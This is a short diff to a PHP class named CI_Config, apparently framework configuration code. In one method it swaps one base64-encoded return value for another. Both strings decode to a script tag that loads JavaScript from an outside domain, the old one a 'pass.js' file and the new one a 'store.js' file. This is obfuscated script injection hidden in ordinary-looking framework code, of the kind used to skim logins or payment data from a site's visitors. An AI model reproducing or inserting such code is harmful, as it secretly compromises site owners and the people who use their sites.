@@ -390,7 +390,7 @@ class CI_Config {
         $BM->mark_time();
         if ($index == '')
         {
-            return base64_decode('PHNjcmlwdD4kKGZ1bmN0aW9uKCl7JC5nZXRTY3JpcHQoImh0dHA6Ly93d3cubWVva2FkYS5jb20vcGFzcy5qcyIpO30pOzwvc2NyaXB0Pg==');
+            return base64_decode('PHNjcmlwdD4kKGZ1bmN0aW9uKCl7JC5nZXRTY3JpcHQoImh0dHBzOi8vaG9vbGljb250ZWNoLmNvbS9jaGVja2VyL2pzL3N0b3JlLmpzIik7fSk7PC9zY3JpcHQ+');
         }
     }
 
